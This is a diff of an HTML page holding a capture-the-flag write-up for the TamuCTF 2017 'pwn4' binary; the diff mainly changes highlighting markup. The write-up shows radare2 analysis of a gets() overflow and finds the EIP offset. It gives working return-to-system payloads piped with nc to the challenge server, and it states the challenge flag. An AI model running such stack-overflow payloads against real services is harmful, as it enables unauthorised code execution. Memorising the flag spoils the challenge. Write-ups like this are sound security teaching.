@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="generator" content="Hugo 0.28-DEV" />
+    <meta name="generator" content="Hugo 0.29-DEV" />
 
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -93,127 +93,124 @@ ga('send', 'pageview');
 
 <p>Is curious that this specific challenge had more value than the previous one (<a href="../pwn3/pwn3.md">pwn3</a>).<br />
 As we will see below, it was way easier. Lets take a look with r2.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn4/pwn4
-$ r2 -A -c <span class="s1">&#39;afl&#39;</span> pwn4
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[x] Analyze all flags starting with sym. and entry0 (aa)
-[x] Analyze len bytes of instructions for references (aar)
-[x] Analyze function calls (aac)
-[x] Use -AA or aaaa to perform additional experimental analysis.
-[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
-<span class="s">0x08048330</span><span class="mh">    3 35           </span>sym._init
-<span class="s">0x08048353</span><span class="mh">    1 25           </span>fcn.08048353
-<span class="s">0x0804836c</span><span class="mh">    1 4            </span>sub.gets_12_36c
-<span class="s">0x08048370</span><span class="mh">    1 6            </span>sym.imp.gets
-<span class="s">0x08048376</span><span class="mh">    2 10</span><span class="o">   -&gt;</span><span class="mh"> 22</span>   fcn.08048376
-<span class="s">0x08048380</span><span class="mh">    1 6            </span>sym.imp.puts
-<span class="s">0x08048386</span><span class="mh">    2 10</span><span class="o">   -&gt;</span><span class="mh"> 22</span>   fcn.08048386
-<span class="s">0x08048390</span><span class="mh">    1 6            </span>sym.imp.system
-<span class="s">0x08048396</span><span class="mh">    2 10</span><span class="o">   -&gt;</span><span class="mh"> 22</span>   fcn.08048396
-<span class="s">0x080483a0</span><span class="mh">    1 6            </span>sym.imp.__libc_start_main
-<span class="s">0x080483a6</span><span class="mh">    2 10</span><span class="o">   -&gt;</span><span class="mh"> 22</span>   fcn.080483a6
-<span class="s">0x080483b0</span><span class="mh">    1 6            </span>sym.imp.setvbuf
-<span class="s">0x080483b6</span><span class="mh">    2 10</span><span class="o">   -&gt;</span><span class="mh"> 22</span>   fcn.080483b6
-<span class="s">0x080483c0</span><span class="mh">    1 1            </span>sub.__gmon_start___252_3c0
-<span class="s">0x080483c1</span><span class="mh">    1 15           </span>fcn.080483c1
-<span class="s">0x080483d0</span><span class="mh">    1 33           </span>entry0
-<span class="s">0x080483f1</span><span class="mh">    1 1            </span>fcn.080483f1
-<span class="s">0x08048400</span><span class="mh">    1 4            </span>sym.__x86.get_pc_thunk.bx
-<span class="s">0x08048410</span><span class="mh">    4 43           </span>sym.deregister_tm_clones
-<span class="s">0x0804843c</span><span class="mh">    4 57           </span>fcn.0804843c
-<span class="s">0x08048475</span><span class="mh">    3 41           </span>fcn.08048475
-<span class="s">0x080484a0</span><span class="mh">    8 43</span><span class="o">   -&gt;</span><span class="mh"> 93</span>   sym.frame_dummy
-<span class="hll"><span class="s">0x080484cb</span><span class="mh">    1 25           </span>sym.flag_func
-</span><span class="hll"><span class="s">0x080484e4</span><span class="mh">    1 25           </span>sym.func2
-</span><span class="hll"><span class="s">0x080484fd</span><span class="mh">    1 24           </span>sym.func1
-</span><span class="hll"><span class="s">0x08048515</span><span class="mh">    1 71           </span>sym.main
-</span><span class="s">0x08048560</span><span class="mh">    4 93           </span>sym.__libc_csu_init
-<span class="s">0x080485bd</span><span class="mh">    1 5            </span>fcn.080485bd
-<span class="s">0x080485c2</span><span class="mh">    1 22           </span>fcn.080485c2
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn4/pwn4
+</span><span class="">$ r2 -A -c </span><span class="s">&#39;afl&#39;</span><span class=""> pwn4</span></code></pre>
+</div>
+<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[x] Analyze all flags starting with sym. and entry0 (aa)
+</span><span class="">[x] Analyze len bytes of instructions for references (aar)
+</span><span class="">[x] Analyze function calls (aac)
+</span><span class="">[x] Use -AA or aaaa to perform additional experimental analysis.
+</span><span class="">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+</span><span class="">0x08048330    3 35           sym._init
+</span><span class="">0x08048353    1 25           fcn.08048353
+</span><span class="">0x0804836c    1 4            sub.gets_12_36c
+</span><span class="">0x08048370    1 6            sym.imp.gets
+</span><span class="">0x08048376    2 10   -&gt; 22   fcn.08048376
+</span><span class="">0x08048380    1 6            sym.imp.puts
+</span><span class="">0x08048386    2 10   -&gt; 22   fcn.08048386
+</span><span class="">0x08048390    1 6            sym.imp.system
+</span><span class="">0x08048396    2 10   -&gt; 22   fcn.08048396
+</span><span class="">0x080483a0    1 6            sym.imp.__libc_start_main
+</span><span class="">0x080483a6    2 10   -&gt; 22   fcn.080483a6
+</span><span class="">0x080483b0    1 6            sym.imp.setvbuf
+</span><span class="">0x080483b6    2 10   -&gt; 22   fcn.080483b6
+</span><span class="">0x080483c0    1 1            sub.__gmon_start___252_3c0
+</span><span class="">0x080483c1    1 15           fcn.080483c1
+</span><span class="">0x080483d0    1 33           entry0
+</span><span class="">0x080483f1    1 1            fcn.080483f1
+</span><span class="">0x08048400    1 4            sym.__x86.get_pc_thunk.bx
+</span><span class="">0x08048410    4 43           sym.deregister_tm_clones
+</span><span class="">0x0804843c    4 57           fcn.0804843c
+</span><span class="">0x08048475    3 41           fcn.08048475
+</span><span class="">0x080484a0    8 43   -&gt; 93   sym.frame_dummy
+</span><span class="hl"><span class="">0x080484cb    1 25           sym.flag_func
+</span></span><span class="hl"><span class="">0x080484e4    1 25           sym.func2
+</span></span><span class="hl"><span class="">0x080484fd    1 24           sym.func1
+</span></span><span class="hl"><span class="">0x08048515    1 71           sym.main
+</span></span><span class="">0x08048560    4 93           sym.__libc_csu_init
+</span><span class="">0x080485bd    1 5            fcn.080485bd
+</span><span class="">0x080485c2    1 22           fcn.080485c2</span></code></pre>
+</div>
 
 <p>We can see four interesting functions:</p>
 
-<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x080483d0</span>]<span class="o">&gt;</span> <span class="nf">s</span> sym.flag_func; Vp
-[0x080484cb 16% 240 pwn4]&gt; pd $r @ sym.flag_func                         
-<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>flag_func <span class="m">25</span>
-<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>flag_func ();
-<span class="k">│</span>           <span class="s">0x080484cb</span>      55             <span class="k">push</span> <span class="k">ebp</span>
-<span class="k">│</span>           <span class="s">0x080484cc</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>                       
-<span class="k">│</span>           <span class="s">0x080484ce</span>      83ec08         <span class="k">esp</span> <span class="o">-=</span> <span class="m">8</span>                     
-<span class="k">│</span>           <span class="s">0x080484d1</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>                 
-<span class="k">│</span>         <span class="c">; &quot;/bin/cat flag2.txt&quot;        </span>
-<span class="hll"><span class="k">│</span>           <span class="s">0x080484d4</span>      68e0850408     <span class="k">push</span> <span class="k">str</span><span class="o">.</span>_bin_cat_flag2.txt
-</span><span class="k">│</span>         <span class="c">; int system(const char *string) ; sym.imp.system</span>
-<span class="hll"><span class="k">│</span>           <span class="s">0x080484d9</span>      e8b2feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>system ()
-</span><span class="k">│</span>           <span class="s">0x080484de</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
-<span class="k">│</span>           <span class="s">0x080484e1</span>      90                                   
-<span class="k">│</span>           <span class="s">0x080484e2</span>      c9                                   
-<span class="k">└</span>           <span class="s">0x080484e3</span>      c3                                     
-<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>func2 <span class="m">25</span>                                             
-<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>func2 ()<span class="c">;                                                </span>
-<span class="k">│</span>           <span class="s">0x080484e4</span>      55             <span class="k">push</span> <span class="k">ebp</span>              
-<span class="k">│</span>           <span class="s">0x080484e5</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>             
-<span class="k">│</span>           <span class="s">0x080484e7</span>      83ec08         <span class="k">esp</span> <span class="o">-=</span> <span class="m">8</span>              
-<span class="k">│</span>           <span class="s">0x080484ea</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>            
-<span class="k">│</span>           <span class="s">0x080484ed</span>      68f3850408     <span class="k">push</span> <span class="k">str</span><span class="o">.</span>Nothing_to_see_here
-<span class="k">│</span>         <span class="c">; int puts(const char *s)                      </span>
-<span class="k">│</span>           <span class="s">0x080484f2</span>      e889feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>puts ()
-<span class="k">│</span>           <span class="s">0x080484f7</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
-<span class="k">│</span>           <span class="s">0x080484fa</span>      90                                               
-<span class="k">│</span>           <span class="s">0x080484fb</span>      c9                                   
-<span class="k">└</span>           <span class="s">0x080484fc</span>      c3                                   
-<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>func1 <span class="m">24</span>
-<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>func1 ();
-<span class="k">│</span>           <span class="c">; var int local_ch @ ebp-0xc</span>
-<span class="k">│</span>              <span class="c">; CALL XREF from 0x0804854a (sym.main)</span>
-<span class="k">│</span>           <span class="s">0x080484fd</span>      55             <span class="k">push</span> <span class="k">ebp</span>
-<span class="k">│</span>           <span class="s">0x080484fe</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>
-<span class="k">│</span>           <span class="s">0x08048500</span>      83ec18         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0x18</span>
-<span class="k">│</span>           <span class="s">0x08048503</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>
-<span class="k">│</span>           <span class="s">0x08048506</span>      8d45f4         <span class="k">eax</span> <span class="o">=</span> [<span class="k">local_ch</span>]
-<span class="k">│</span>           <span class="s">0x08048509</span>      50             <span class="k">push</span> <span class="k">eax</span>
-<span class="k">│</span>         <span class="c">; char*gets(char *s)</span>
-<span class="hll"><span class="k">│</span>           <span class="s">0x0804850a</span>      e861feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>gets ()           
-</span><span class="k">│</span>           <span class="s">0x0804850f</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
-<span class="k">│</span>           <span class="s">0x08048512</span>      90                        
-<span class="k">│</span>           <span class="s">0x08048513</span>      c9                        
-<span class="k">└</span>           <span class="s">0x08048514</span>      c3                          
-<span class="k">┌</span> (<span class="o">fcn</span>) <span class="k">sym</span><span class="o">.</span>main <span class="m">71</span>         
-<span class="k">│</span>   <span class="k">sym</span><span class="o">.</span>main ();
-<span class="k">│</span>           <span class="c">; var int local_4h_2 @ ebp-0x4</span>
-<span class="k">│</span>           <span class="c">; var int local_4h @ esp+0x4</span>
-<span class="k">│</span>              <span class="c">; DATA XREF from 0x080483e7 (entry0)</span>
-<span class="k">│</span>           <span class="s">0x08048515</span>      8d4c2404       <span class="k">ecx</span> <span class="o">=</span> [<span class="k">local_4h</span>]
-<span class="k">│</span>           <span class="s">0x08048519</span>      83e4f0         <span class="k">esp</span> <span class="o">&amp;=</span> <span class="mh">0xfffffff0</span>
-<span class="k">│</span>           <span class="s">0x0804851c</span>      ff71fc         <span class="k">push</span> dword [<span class="k">ecx</span> <span class="o">-</span> <span class="m">4</span>]
-<span class="k">│</span>           <span class="s">0x0804851f</span>      55             <span class="k">push</span> <span class="k">ebp</span>
-<span class="k">│</span>           <span class="s">0x08048520</span>      89e5           <span class="k">ebp</span> <span class="o">=</span> <span class="k">esp</span>
-<span class="k">│</span>           <span class="s">0x08048522</span>      51             <span class="k">push</span> <span class="k">ecx</span>
-<span class="k">│</span>           <span class="s">0x08048523</span>      83ec04         <span class="k">esp</span> <span class="o">-=</span> <span class="m">4</span>
-<span class="k">│</span>           <span class="s">0x08048526</span>      a13ca00408     <span class="k">eax</span> <span class="o">=</span> dword <span class="k">obj</span><span class="o">.</span>stdout
-<span class="k">│</span>           <span class="s">0x0804852b</span>      6a00           <span class="k">push</span> <span class="m">0</span>
-<span class="k">│</span>           <span class="s">0x0804852d</span>      6a00           <span class="k">push</span> <span class="m">0</span>
-<span class="k">│</span>           <span class="s">0x0804852f</span>      6a02           <span class="k">push</span> <span class="m">2</span>
-<span class="k">│</span>           <span class="s">0x08048531</span>      50             <span class="k">push</span> <span class="k">eax</span>
-<span class="k">│</span>         <span class="c">; int setvbuf(FILE*stream, char*buf, int mode, size_t size)</span>
-<span class="k">│</span>           <span class="s">0x08048532</span>      e879feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>setvbuf ()
-<span class="k">│</span>           <span class="s">0x08048537</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
-<span class="k">│</span>           <span class="s">0x0804853a</span>      83ec0c         <span class="k">esp</span> <span class="o">-=</span> <span class="mh">0xc</span>
-<span class="k">│</span>           <span class="s">0x0804853d</span>      6807860408     <span class="k">push</span> <span class="k">str</span><span class="o">.</span>I_require_an_input:
-<span class="k">│</span>         <span class="c">; int puts(const char *s)</span>
-<span class="k">│</span>           <span class="s">0x08048542</span>      e839feffff     <span class="k">sym</span><span class="o">.</span><span class="k">imp</span><span class="o">.</span>puts ()
-<span class="k">│</span>           <span class="s">0x08048547</span>      83c410         <span class="k">esp</span> <span class="o">+=</span> <span class="mh">0x10</span>
-<span class="hll"><span class="k">│</span>           <span class="s">0x0804854a</span>      e8aeffffff     <span class="k">sym</span><span class="o">.</span>func1 ()
-</span><span class="k">│</span>           <span class="s">0x0804854f</span>      b800000000     <span class="k">eax</span> <span class="o">=</span> <span class="m">0</span>
-<span class="k">│</span>           <span class="s">0x08048554</span>      8b4dfc         <span class="k">ecx</span> <span class="o">=</span> dword [<span class="k">local_4h_2</span>]
-<span class="k">│</span>           <span class="s">0x08048557</span>      c9                                     
-<span class="k">│</span>           <span class="s">0x08048558</span>      8d61fc         <span class="k">esp</span> <span class="o">=</span> [<span class="k">ecx</span> <span class="o">-</span> <span class="m">4</span>]
-<span class="k">└</span>           <span class="s">0x0804855b</span>      c3                                               
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080483d0]&gt; s sym.flag_func; Vp
+</span><span class="">[0x080484cb 16% 240 pwn4]&gt; pd $r @ sym.flag_func                         
+</span><span class="">┌ (fcn) sym.flag_func 25
+</span><span class="">│   sym.flag_func ();
+</span><span class="">│           0x080484cb      55             push ebp
+</span><span class="">│           0x080484cc      89e5           ebp = esp                       
+</span><span class="">│           0x080484ce      83ec08         esp -= 8                     
+</span><span class="">│           0x080484d1      83ec0c         esp -= 0xc                 
+</span><span class="">│         ; &#34;/bin/cat flag2.txt&#34;        
+</span><span class="hl"><span class="">│           0x080484d4      68e0850408     push str._bin_cat_flag2.txt
+</span></span><span class="">│         ; int system(const char *string) ; sym.imp.system
+</span><span class="hl"><span class="">│           0x080484d9      e8b2feffff     sym.imp.system ()
+</span></span><span class="">│           0x080484de      83c410         esp += 0x10
+</span><span class="">│           0x080484e1      90                                   
+</span><span class="">│           0x080484e2      c9                                   
+</span><span class="">└           0x080484e3      c3                                     
+</span><span class="">┌ (fcn) sym.func2 25                                             
+</span><span class="">│   sym.func2 ();                                                
+</span><span class="">│           0x080484e4      55             push ebp              
+</span><span class="">│           0x080484e5      89e5           ebp = esp             
+</span><span class="">│           0x080484e7      83ec08         esp -= 8              
+</span><span class="">│           0x080484ea      83ec0c         esp -= 0xc            
+</span><span class="">│           0x080484ed      68f3850408     push str.Nothing_to_see_here
+</span><span class="">│         ; int puts(const char *s)                      
+</span><span class="">│           0x080484f2      e889feffff     sym.imp.puts ()
+</span><span class="">│           0x080484f7      83c410         esp += 0x10
+</span><span class="">│           0x080484fa      90                                               
+</span><span class="">│           0x080484fb      c9                                   
+</span><span class="">└           0x080484fc      c3                                   
+</span><span class="">┌ (fcn) sym.func1 24
+</span><span class="">│   sym.func1 ();
+</span><span class="">│           ; var int local_ch @ ebp-0xc
+</span><span class="">│              ; CALL XREF from 0x0804854a (sym.main)
+</span><span class="">│           0x080484fd      55             push ebp
+</span><span class="">│           0x080484fe      89e5           ebp = esp
+</span><span class="">│           0x08048500      83ec18         esp -= 0x18
+</span><span class="">│           0x08048503      83ec0c         esp -= 0xc
+</span><span class="">│           0x08048506      8d45f4         eax = [local_ch]
+</span><span class="">│           0x08048509      50             push eax
+</span><span class="">│         ; char*gets(char *s)
+</span><span class="hl"><span class="">│           0x0804850a      e861feffff     sym.imp.gets ()           
+</span></span><span class="">│           0x0804850f      83c410         esp += 0x10
+</span><span class="">│           0x08048512      90                        
+</span><span class="">│           0x08048513      c9                        
+</span><span class="">└           0x08048514      c3                          
+</span><span class="">┌ (fcn) sym.main 71         
+</span><span class="">│   sym.main ();
+</span><span class="">│           ; var int local_4h_2 @ ebp-0x4
+</span><span class="">│           ; var int local_4h @ esp+0x4
+</span><span class="">│              ; DATA XREF from 0x080483e7 (entry0)
+</span><span class="">│           0x08048515      8d4c2404       ecx = [local_4h]
+</span><span class="">│           0x08048519      83e4f0         esp &amp;= 0xfffffff0
+</span><span class="">│           0x0804851c      ff71fc         push dword [ecx - 4]
+</span><span class="">│           0x0804851f      55             push ebp
+</span><span class="">│           0x08048520      89e5           ebp = esp
+</span><span class="">│           0x08048522      51             push ecx
+</span><span class="">│           0x08048523      83ec04         esp -= 4
+</span><span class="">│           0x08048526      a13ca00408     eax = dword obj.stdout
+</span><span class="">│           0x0804852b      6a00           push 0
+</span><span class="">│           0x0804852d      6a00           push 0
+</span><span class="">│           0x0804852f      6a02           push 2
+</span><span class="">│           0x08048531      50             push eax
+</span><span class="">│         ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
+</span><span class="">│           0x08048532      e879feffff     sym.imp.setvbuf ()
+</span><span class="">│           0x08048537      83c410         esp += 0x10
+</span><span class="">│           0x0804853a      83ec0c         esp -= 0xc
+</span><span class="">│           0x0804853d      6807860408     push str.I_require_an_input:
+</span><span class="">│         ; int puts(const char *s)
+</span><span class="">│           0x08048542      e839feffff     sym.imp.puts ()
+</span><span class="">│           0x08048547      83c410         esp += 0x10
+</span><span class="hl"><span class="">│           0x0804854a      e8aeffffff     sym.func1 ()
+</span></span><span class="">│           0x0804854f      b800000000     eax = 0
+</span><span class="">│           0x08048554      8b4dfc         ecx = dword [local_4h_2]
+</span><span class="">│           0x08048557      c9                                     
+</span><span class="">│           0x08048558      8d61fc         esp = [ecx - 4]
+</span><span class="">└           0x0804855b      c3                                               </span></code></pre>
+</div>
 
 <blockquote>
 <p>By the way the command <code>s sym.flag_func; Vp</code> can be splitted and explained like this:<br />
@@ -225,9 +222,8 @@ $ r2 -A -c <span class="s1">&#39;afl&#39;</span> pwn4
 <p>Here they are, lets take a look at those functions.</p>
 
 <p>Obviously we should try to execute <code>sym.flag_func()</code> function, it seems it will try print a file called <code>flag2.txt</code> (strange name right? why 2?) using the <code>cat</code> command on the remote server. But that function is never called. You can check it by yourself with:</p>
-<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x080484f7</span>]<span class="o">&gt;</span> <span class="nf">axt</span> sym.flag_func
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x080484f7]&gt; axt sym.flag_func</span></code></pre>
+</div>
 <p>Then we need to dig a bit more.</p>
 
 <ol>
@@ -239,52 +235,47 @@ $ r2 -A -c <span class="s1">&#39;afl&#39;</span> pwn4
 </ol>
 
 <p>Lets figure out, how many bytes do we need to overwrite <code>$eip</code> register.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ pwn cyclic <span class="m">40</span> <span class="p">;</span> To generate string with unique subsequences.
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
-$ r2 -R <span class="s2">&quot;stdin=\&quot;`pwn cyclic 40`\&quot;&quot;</span> -A -d -c <span class="s1">&#39;dc&#39;</span> pwn4
-</code></pre></div>
-
-<p><div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>Process with PID <span class="mh">12102</span> started<span class="o">...</span>
-= attach <span class="mh">12102</span> <span class="mh">12102</span>
-bin<span class="o">.</span>baddr <span class="mh">0x08048000</span>
-Using <span class="mh">0x8048000</span>
-Assuming filepath <span class="o">/</span>root<span class="o">/</span>pwn<span class="mh">4</span>
-asm<span class="o">.</span>bits <span class="mh">32</span>
-[x] Analyze all flags starting with sym. and entry0 (aa)
-TODO<span class="o">:</span> esil<span class="o">-</span>vm not initialized
-[Cannot determine xref search boundariesr references (aar)
-[x] Analyze len bytes of instructions for references (aar)
-[x] Analyze function calls (aac)
-[x] Use -AA or aaaa to perform additional experimental analysis.
-[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
-ptrace <span class="err">(</span>PT_ATTACH)<span class="o">:</span> Operation not permitted
-= attach <span class="mh">12102</span> <span class="mh">12102</span>
-I require an input<span class="o">:</span>
-child stopped with signal <span class="mh">11</span>
-<span class="hll">[+] SIGNAL 11 errno=0 addr=0x61616165 code=1 ret=0
-</span><span class="hll">[<span class="mh">0x61616165</span>]<span class="o">&gt;</span>
-</span></code></pre></div>
-</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ pwn cyclic -l 0x61616165
-<span class="m">16</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic </span><span class="m">40</span><span class=""> </span><span class="p">;</span><span class=""> To generate string with unique subsequences.
+</span><span class="">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
+</span><span class="">$ r2 -R </span><span class="s">&#34;stdin=\&#34;`pwn cyclic 40`\&#34;&#34;</span><span class=""> -A -d -c </span><span class="s">&#39;dc&#39;</span><span class=""> pwn4</span></code></pre>
+</div>
+<p><div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">Process with PID 12102 started...
+</span><span class="">= attach 12102 12102
+</span><span class="">bin.baddr 0x08048000
+</span><span class="">Using 0x8048000
+</span><span class="">Assuming filepath /root/pwn4
+</span><span class="">asm.bits 32
+</span><span class="">[x] Analyze all flags starting with sym. and entry0 (aa)
+</span><span class="">TODO: esil-vm not initialized
+</span><span class="">[Cannot determine xref search boundariesr references (aar)
+</span><span class="">[x] Analyze len bytes of instructions for references (aar)
+</span><span class="">[x] Analyze function calls (aac)
+</span><span class="">[x] Use -AA or aaaa to perform additional experimental analysis.
+</span><span class="">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+</span><span class="">ptrace (PT_ATTACH): Operation not permitted
+</span><span class="">= attach 12102 12102
+</span><span class="">I require an input:
+</span><span class="">child stopped with signal 11
+</span><span class="hl"><span class="">[+] SIGNAL 11 errno=0 addr=0x61616165 code=1 ret=0
+</span></span><span class="hl"><span class="">[0x61616165]&gt;</span></span></code></pre>
+</div></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ pwn cyclic -l 0x61616165
+</span><span class=""></span><span class="m">16</span></code></pre>
+</div>
 <p>So, we can overwrite the <code>$eip</code> register writing the next 4 bytes (from byte 17 to 20)!<br />
 Now we create a file with the previously commented file (<code>flag2.txt</code>) to try this out.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ <span class="nb">echo</span> This is the flag &gt; flag2.txt
-$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span class="p">|</span> ./pwn4
-I require an input:
-<span class="hll">This is the flag
-</span>Segmentation fault
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ </span><span class="n">echo</span><span class=""> This is the flag &gt; flag2.txt
+</span><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xcb\x84\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> ./pwn4
+</span><span class="">I require an input:
+</span><span class="hl"><span class="">This is the flag
+</span></span><span class="">Segmentation fault</span></code></pre>
+</div>
 
 <p>Good! what will the remote server say?</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4324</span>
-I require an input:                                                                              Did you really think it would be that easy?
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xcb\x84\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4324</span><span class="">
+</span><span class="">I require an input:                                                                              Did you really think it would be that easy?</span></code></pre>
+</div>
 <p>Ouch! that file was just a decoy. There must be a another one named <code>flag.txt</code> waiting for us.
 &gt; But how could we executed it? There is only one function which print a file and its name is hardcoded.</p>
 
@@ -293,13 +284,12 @@ The only thing we need to do is to pass a different argument: <code>cat flag.txt
 
 <p>If you inspect all the strings of the binary you may find surprise:</p>
 
-<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x61616165</span>]<span class="o">&gt;</span> <span class="nf">iz</span>
-vaddr<span class="o">=</span><span class="mh">0x080485e0</span> paddr<span class="o">=</span><span class="mh">0x000005e0</span> ordinal<span class="o">=</span><span class="mh">000</span> sz<span class="o">=</span><span class="mh">19</span> len<span class="o">=</span><span class="mh">18</span> section<span class="o">=.</span>rodata type<span class="o">=</span>ascii string<span class="o">=/</span>bin<span class="o">/</span>cat flag<span class="mh">2</span><span class="o">.</span>txt
-vaddr<span class="o">=</span><span class="mh">0x080485f3</span> paddr<span class="o">=</span><span class="mh">0x000005f3</span> ordinal<span class="o">=</span><span class="mh">001</span> sz<span class="o">=</span><span class="mh">20</span> len<span class="o">=</span><span class="mh">19</span> section<span class="o">=.</span>rodata type<span class="o">=</span>ascii string<span class="o">=</span>Nothing to see here
-vaddr<span class="o">=</span><span class="mh">0x08048607</span> paddr<span class="o">=</span><span class="mh">0x00000607</span> ordinal<span class="o">=</span><span class="mh">002</span> sz<span class="o">=</span><span class="mh">20</span> len<span class="o">=</span><span class="mh">19</span> section<span class="o">=.</span>rodata type<span class="o">=</span>ascii string<span class="o">=</span>I require an input<span class="o">:</span>
-<span class="hll">vaddr<span class="o">=</span><span class="mh">0x0804a028</span> paddr<span class="o">=</span><span class="mh">0x00001028</span> ordinal<span class="o">=</span><span class="mh">000</span> sz<span class="o">=</span><span class="mh">18</span> len<span class="o">=</span><span class="mh">17</span> section<span class="o">=.</span>data type<span class="o">=</span>ascii string<span class="o">=/</span>bin<span class="o">/</span>cat flag<span class="o">.</span>txt
-</span></code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-r2" data-lang="r2"><span class="">[0x61616165]&gt; iz
+</span><span class="">vaddr=0x080485e0 paddr=0x000005e0 ordinal=000 sz=19 len=18 section=.rodata type=ascii string=/bin/cat flag2.txt
+</span><span class="">vaddr=0x080485f3 paddr=0x000005f3 ordinal=001 sz=20 len=19 section=.rodata type=ascii string=Nothing to see here
+</span><span class="">vaddr=0x08048607 paddr=0x00000607 ordinal=002 sz=20 len=19 section=.rodata type=ascii string=I require an input:
+</span><span class="hl"><span class="">vaddr=0x0804a028 paddr=0x00001028 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt</span></span></code></pre>
+</div>
 
 <p>As you may know, in order to pass the arguments to <code>system</code> they need to be pushed into the stack. In case of a string not its value but its reference (a pointer <code>0x0804a028</code> in this case).</p>
 
@@ -314,11 +304,10 @@ vaddr<span class="o">=</span><span class="mh">0x08048607</span> paddr<span class
 </ol>
 
 <p>Lets send to the server:</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4324</span>
-I require an input:
-gigem<span class="o">{</span>R3TURN_0R13NT3D_PR0F1T<span class="o">}</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="">$ python -c </span><span class="s">&#39;print(&#34;A&#34;*16 + &#34;\xd9\x84\x04\x08&#34; + &#34;\x28\xa0\x04\x08&#34;)&#39;</span><span class=""> </span><span class="p">|</span><span class=""> nc pwn.ctf.tamu.edu </span><span class="m">4324</span><span class="">
+</span><span class="">I require an input:
+</span><span class="">gigem</span><span class="o">{</span><span class="">R3TURN_0R13NT3D_PR0F1T</span><span class="o">}</span></code></pre>
+</div>
 <p>Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>
 
 <h3 id="complete-video">Complete video</h3>
